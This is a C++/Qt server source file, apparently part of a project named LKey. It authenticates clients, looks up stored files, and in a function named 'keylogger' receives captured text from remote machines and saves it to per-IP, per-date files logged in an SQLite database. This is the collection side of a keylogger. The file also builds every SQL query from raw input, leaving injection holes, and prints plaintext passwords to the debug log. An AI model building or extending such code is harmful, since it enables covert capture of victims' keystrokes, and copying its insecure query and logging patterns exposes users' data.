#include "functions.h"
#include "mytcpserver.h"

QSqlDatabase open_db(){
    // Открытие базы данных
    QSqlDatabase db = QSqlDatabase::addDatabase("QSQLITE");
    db.setHostName("sqlite.db");
    db.setDatabaseName("D:/LKey/server/sqlite.db");
    if(db.open()){
         qDebug() << "DB is started";
    } else {
         qDebug() << "DB is not started";
    }

    return db;
}

QString authorize(std::string message) {
    //find login
    int pos = message.find("&");
    std::string login = message.substr(0, pos);
    message.erase(0, pos + 1);

    //find password
    pos = message.find("&");
    std::string password = message.substr(0, pos);
    message.erase(0, pos + 1);

    //print pas&log
    qDebug() << "login: " << QString::fromStdString(login);
    qDebug() << "pass: " << QString::fromStdString(password);

    //send query
    QSqlDatabase db = open_db();

    QString mes_db;
    QSqlQuery query(db);
    query.exec("SELECT * FROM authorize WHERE login = '" + QString::fromStdString(login) + "' AND password = '" + QString::fromStdString(password) + "'");
    QSqlRecord rec = query.record();
    const int loginIndex = rec.indexOf("login");
    const int passIndex = rec.indexOf("password");

    //read output
    while(query.next())
        mes_db = query.value(loginIndex).toString() + query.value(passIndex).toString();

    db.close();

    //form result
    QString result = "auth&";
    if (mes_db != "")
        result += "true";
    else
        result += "false";

    return result;
}

QString get_file(std::string message) {
    //find date
    int pos = message.find("&");
    std::string cdate = message.substr(0, pos);
    message.erase(0, pos + 1);

    //find ip
    pos = message.find("&");
    std::string ip = message.substr(0, pos);
    std::replace(ip.begin(), ip.end(), '.', '-');
    message.erase(0, pos + 1);

    QString result = "file&";

    //send query
    QSqlDatabase db = open_db();

    QSqlQuery query(db);
    query.exec("SELECT path FROM files WHERE date_audit = \'" + QString::fromStdString(cdate) + "\' AND ip = \'" + QString::fromStdString(ip) + "\'");
    QSqlRecord rec = query.record();
    const int pathIndex = rec.indexOf("path");

    qDebug() << "ip = " <<  QString::fromStdString(ip);

    //read output and form result
    while(query.next())
        result += query.value(pathIndex).toString();

    db.close();

    return result;
}

QString keylogger(std::string message) {
    //find ip
    int pos = message.find("&");
    std::string ip = message.substr(0, pos);
    std::replace(ip.begin(), ip.end(), '.', '-');
    message.erase(0, pos + 1);

    //find date
    pos = message.find("&");
    std::string cdate = message.substr(0, pos);
    message.erase(0, pos + 1);

    //print ip&date
    qDebug() << "ip: " << QString::fromStdString(ip);
    qDebug() << "date: " << QString::fromStdString(cdate);

    //read file
    QFile target;
    QString name = QString::fromStdString(ip+"_"+cdate+".txt");
    target.setFileName("D:/LKey/files/"+name);
    target.open(QIODevice::WriteOnly | QIODevice::Append);
    QTextStream writeStream(&target);
    writeStream << QString::fromStdString(message);
    writeStream << "\n";
    target.close();

    //send query
    QSqlDatabase db = open_db();

    QSqlQuery query(db);
    query.exec("INSERT INTO files VALUES (\'" + QString::fromStdString(cdate) + "\', \'D:/LKey/files/" + name + "\', \'" + QString::fromStdString(ip) + "\')");

    db.close();

    //form result
    QString result = QString::fromStdString(cdate) + "&" + QString::fromStdString(ip);
    return result;
}
